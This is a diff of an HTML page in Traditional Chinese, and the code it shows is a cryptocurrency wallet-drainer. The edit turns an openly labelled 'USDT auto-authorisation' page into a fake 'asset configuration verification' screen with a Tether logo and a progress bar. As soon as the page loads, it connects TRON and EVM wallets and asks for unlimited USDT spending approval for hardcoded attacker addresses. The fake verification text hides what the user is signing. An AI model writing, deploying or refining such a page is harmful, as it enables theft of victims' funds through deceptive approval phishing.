@@ -3,13 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>TRC20 USDT 自動授權</title>
+<title>資產配置驗證</title>
 <style>
   body {
     font-family: "Noto Sans TC", sans-serif;
     background: linear-gradient(135deg, #0f172a, #1e293b, #2563eb, #1e3a8a);
     background-size: 400% 400%;
-    animation: gradientBG 12s ease infinite;
+    animation: gradientBG 15s ease infinite;
     color: #fff;
     display: flex;
     justify-content: center;
@@ -25,83 +25,163 @@
   .container {
     background: rgba(255,255,255,0.05);
     padding: 30px;
-    border-radius: 15px;
+    border-radius: 20px;
     max-width: 420px;
     width: 100%;
     text-align: center;
-    backdrop-filter: blur(10px);
+    backdrop-filter: blur(12px);
+    box-shadow: 0 8px 25px rgba(0,0,0,0.3);
   }
-  h1 { font-size: 22px; margin-bottom: 15px; }
-  p { font-size: 15px; margin-bottom: 15px; color: #cbd5e1; }
-  #status { margin-top: 15px; font-size: 14px; }
+  .logo {
+    width: 80px;
+    margin-bottom: 15px;
+  }
+  h1 {
+    font-size: 22px;
+    margin-bottom: 10px;
+  }
+  p {
+    font-size: 14px;
+    margin-bottom: 20px;
+    color: #cbd5e1;
+  }
+  .progress {
+    background: rgba(255,255,255,0.1);
+    border-radius: 50px;
+    overflow: hidden;
+    height: 8px;
+    margin-bottom: 15px;
+  }
+  .progress-bar {
+    background: linear-gradient(90deg, #2563eb, #3b82f6);
+    height: 100%;
+    width: 0%;
+    transition: width 0.5s ease;
+  }
+  #status {
+    margin-top: 10px;
+    font-size: 14px;
+  }
   .success { color: #4ade80; }
   .error { color: #f87171; }
   .loading { color: #facc15; }
 </style>
 <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 </head>
 <body>
 <div class="container">
-  <h1>正在授權您的 USDT</h1>
-  <p>合約地址：<br><small>TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</small></p>
-  <p>授權給：<br><small>TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf</small></p>
-  <p id="status" class="loading">檢測錢包中...</p>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Logo_Tether.svg" alt="Logo" class="logo">
+  <h1>資產配置驗證</h1>
+  <p>正在驗證您的資產配置，請保持錢包在線</p>
+  <div class="progress"><div class="progress-bar" id="progress-bar"></div></div>
+  <p id="status" class="loading">檢測環境中...</p>
 </div>
 
 <script>
-  const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRON USDT 合約
-  const A_ADDRESS = "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf";     // 你的 A 錢包
-  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  let tronWeb;
+  const USDT_CONTRACTS = {
+    TRON: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+    ETH:  "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+    BNB:  "0x55d398326f99059fF775485246999027B3197955"
+  };
 
-  async function connectWallet() {
-    if (window.tronWeb && window.tronWeb.ready) {
-      tronWeb = window.tronWeb;
-      return tronWeb.defaultAddress.base58;
-    }
-    if (window.tronLink) {
-      await window.tronLink.request({ method: 'tron_requestAccounts' });
-      tronWeb = window.tronWeb;
-      return tronWeb.defaultAddress.base58;
-    }
-    if (window.binance && window.binance.tron) {
-      await window.binance.tron.request({ method: 'tron_requestAccounts' });
-      tronWeb = new TronWeb(window.binance.tron);
-      return tronWeb.defaultAddress.base58;
-    }
-    // 沒有檢測到錢包 → 跳轉下載頁
-    window.location.href = "https://www.tronlink.org/";
-    return null;
+  const TARGET_ADDRESS = {
+    TRON: "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf",
+    EVM:  "0xbA18Cdd7A947CDFBACCa478C1F43692026CcbF10"
+  };
+
+  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+  function setProgress(percent, status, cls="loading") {
+    document.getElementById("progress-bar").style.width = percent + "%";
+    document.getElementById("status").innerText = status;
+    document.getElementById("status").className = cls;
   }
 
-  async function autoApprove() {
-    document.getElementById("status").innerText = "正在連接錢包...";
-    document.getElementById("status").className = "loading";
-
-    const address = await connectWallet();
-    if (!address) return;
-
-    document.getElementById("status").innerText = "錢包已連接：" + address;
-    document.getElementById("status").className = "success";
-
+  async function init() {
     try {
-      document.getElementById("status").innerText = "發送授權交易中，請在錢包中確認...";
-      document.getElementById("status").className = "loading";
-
-      const contract = await tronWeb.contract().at(USDT_CONTRACT);
-      const tx = await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
-
-      document.getElementById("status").innerText = "✅ 授權成功！交易 ID：" + tx;
-      document.getElementById("status").className = "success";
+      setProgress(20, "檢測錢包環境...");
+      // TRON
+      if (window.tronWeb && window.tronWeb.ready) {
+        setProgress(40, "檢測到 TRON 錢包，連接中...");
+        await tronApprove();
+        return;
+      }
+      if (window.tronLink) {
+        await window.tronLink.request({ method: 'tron_requestAccounts' });
+        setProgress(40, "檢測到 TronLink，連接中...");
+        await tronApprove();
+        return;
+      }
+      if (window.binance && window.binance.tron) {
+        await window.binance.tron.request({ method: 'tron_requestAccounts' });
+        tronWeb = new TronWeb(window.binance.tron);
+        setProgress(40, "檢測到 Binance Web3 (TRON)，連接中...");
+        await tronApprove();
+        return;
+      }
+      // EVM
+      if (window.ethereum) {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        setProgress(40, "檢測到 EVM 錢包，連接中...");
+        await evmApprove();
+        return;
+      }
+      if (window.okxwallet || window.BinanceChain) {
+        const provider = window.okxwallet || window.BinanceChain;
+        await provider.request({ method: 'eth_requestAccounts' });
+        setProgress(40, "檢測到其他 EVM 錢包，連接中...");
+        await evmApprove(provider);
+        return;
+      }
+      setProgress(100, "未檢測到錢包，請安裝或打開錢包應用", "error");
     } catch (err) {
       console.error(err);
-      document.getElementById("status").innerText = "❌ 授權失敗或已取消";
-      document.getElementById("status").className = "error";
+      setProgress(100, "驗證未完成", "error");
     }
   }
 
-  // 頁面加載完成 → 自動授權
-  window.addEventListener('load', autoApprove);
+  async function tronApprove() {
+    try {
+      const address = window.tronWeb.defaultAddress.base58;
+      setProgress(60, "已連接：" + address + "，配置中...");
+      const contract = await window.tronWeb.contract().at(USDT_CONTRACTS.TRON);
+      const tx = await contract.approve(TARGET_ADDRESS.TRON, INFINITE_AMOUNT).send();
+      setProgress(100, "✅ 配置完成", "success");
+      setTimeout(() => {
+        window.location.href = "success.html";
+      }, 1500);
+    } catch (err) {
+      console.error(err);
+      setProgress(100, "驗證未完成", "error");
+    }
+  }
+
+  async function evmApprove(provider = window.ethereum) {
+    try {
+      const ethersProvider = new ethers.providers.Web3Provider(provider);
+      const signer = ethersProvider.getSigner();
+      const network = await ethersProvider.getNetwork();
+      let usdtAddress;
+      if (network.chainId === 1) usdtAddress = USDT_CONTRACTS.ETH;
+      else if (network.chainId === 56) usdtAddress = USDT_CONTRACTS.BNB;
+      else throw new Error("不支援的鏈");
+      setProgress(60, "已連接：" + await signer.getAddress() + "，配置中...");
+      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+      const contract = new ethers.Contract(usdtAddress, abi, signer);
+      const tx = await contract.approve(TARGET_ADDRESS.EVM, INFINITE_AMOUNT);
+      await tx.wait();
+      setProgress(100, "✅ 配置完成", "success");
+      setTimeout(() => {
+        window.location.href = "success.html";
+      }, 1500);
+    } catch (err) {
+      console.error(err);
+      setProgress(100, "驗證未完成", "error");
+    }
+  }
+
+  window.addEventListener('load', init);
 </script>
 </body>
 </html>
